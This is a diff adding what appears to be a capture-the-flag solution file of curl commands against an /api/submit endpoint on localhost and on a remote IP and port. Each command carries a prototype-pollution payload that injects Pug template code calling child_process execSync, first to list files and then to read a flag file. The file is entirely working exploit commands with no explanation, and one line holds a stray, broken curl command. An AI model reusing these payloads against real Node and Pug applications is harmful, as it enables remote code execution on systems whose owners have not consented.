@@ -1,0 +1,20 @@
+curl 'http://localhost:1337/api/submit' \
+  -H 'Content-Type: application/json' \
+  --data-raw '{"song.name":"1. Not Polluting with the boys\n\n", "__proto__.block": {"type": "Text", "line": "process.mainModule.require(\"child_process\").execSync(\"ls -la\").toString()"}}' \
+  --compressed \
+  --insecure
+
+curl 'http://localhost:1337/api/submit' \
+curl 46.101.22.121:32109/api/submit \
+  -H 'Content-Type: application/json' \
+  --data-raw '{"song.name":"1. Not Polluting with the boys\n\n", "__proto__.block": {"type": "Text", "line": "\"\";pug_html = process.mainModule.require(\"child_process\").execSync(\"ls -la\").toString()"}}' \
+  --compressed \
+  --insecure
+
+  flagLEOHX
+
+curl 46.101.22.121:32109/api/submit \
+  -H 'Content-Type: application/json' \
+  --data-raw '{"song.name":"1. Not Polluting with the boys\n\n", "__proto__.block": {"type": "Text", "line": "\"\";pug_html = process.mainModule.require(\"child_process\").execSync(\"cat flagLEOHX\").toString()"}}' \
+  --compressed \
+  --insecure
